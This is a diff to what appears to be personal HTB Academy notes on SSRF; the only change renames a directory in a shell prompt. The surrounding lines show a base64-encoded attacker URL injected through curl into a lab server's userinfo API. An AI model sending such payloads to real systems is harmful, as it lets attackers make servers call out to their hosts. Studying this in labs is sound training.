@@ -118,7 +118,7 @@ Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us
 
 echo "http://10.10.15.95:5555" | tr -d '\n' | base64 
 aHR0cDovLzEwLjEwLjE1Ljk1OjU1NTU=  
-~/Inev/htb_academy ❯ curl "http://10.129.202.133:3000/api/userinfo?id=aHR0cDovLzEwLjEwLjE1Ljk1OjU1NTU="
+~/g1gs/htb_academy ❯ curl "http://10.129.202.133:3000/api/userinfo?id=aHR0cDovLzEwLjEwLjE1Ljk1OjU1NTU="
 curl: (52) Empty reply from server
 ```
 ## Regular Expression Denial of Service (ReDoS)
